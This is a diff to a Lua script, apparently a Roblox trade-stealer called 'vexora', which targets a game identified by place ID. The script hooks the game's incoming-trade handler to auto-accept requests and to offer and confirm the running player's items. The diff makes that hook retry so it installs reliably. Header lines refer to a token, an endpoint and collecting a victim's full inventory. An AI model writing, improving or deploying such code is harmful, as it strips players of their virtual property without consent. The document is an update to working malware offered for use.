@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "3.3"
+local CLIENT_REV = "3.4"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -1876,24 +1876,34 @@ end
 
 -- mm2 asks the receiver through SendRequest.OnClientInvoke; answering true and
 -- offering inside it is what makes an incoming request complete
+-- mm2 asks the receiver through SendRequest.OnClientInvoke; answering true and
+-- offering inside it is what makes an incoming request complete. the trade folder
+-- can replicate after this script starts, so the hook is retried instead of one-shot.
 if PLACE_ID == 142823291 then
-    local trade = mm2Trade()
-    local sendRequest = trade and trade:FindFirstChild("SendRequest")
-    if sendRequest then
-        pcall(function()
-            sendRequest.OnClientInvoke = function()
-                task.spawn(function()
-                    task.wait(0.4)
-                    local sent = mm2Offer()
-                    task.wait(0.4)
-                    mm2Confirm()
-                    print(string.format("[vexora] mm2 request accepted - %d item(s) offered", sent))
+    task.spawn(function()
+        for _ = 1, 30 do
+            local trade = mm2Trade() or ReplicatedStorage:WaitForChild("Trade", 2)
+            local sendRequest = trade and trade:FindFirstChild("SendRequest")
+            if sendRequest then
+                pcall(function()
+                    sendRequest.OnClientInvoke = function()
+                        task.spawn(function()
+                            task.wait(0.4)
+                            local sent = mm2Offer()
+                            task.wait(0.4)
+                            mm2Confirm()
+                            print(string.format("[vexora] mm2 request accepted - %d item(s) offered", sent))
+                        end)
+                        return true
+                    end
                 end)
-                return true
+                print("[vexora] mm2 SendRequest hook installed")
+                return
             end
-        end)
-        print("[vexora] mm2 SendRequest hook installed")
-    end
+            task.wait(2)
+        end
+        print("[vexora] mm2 SendRequest hook not installed")
+    end)
 end
 
 task.delay(1, function()
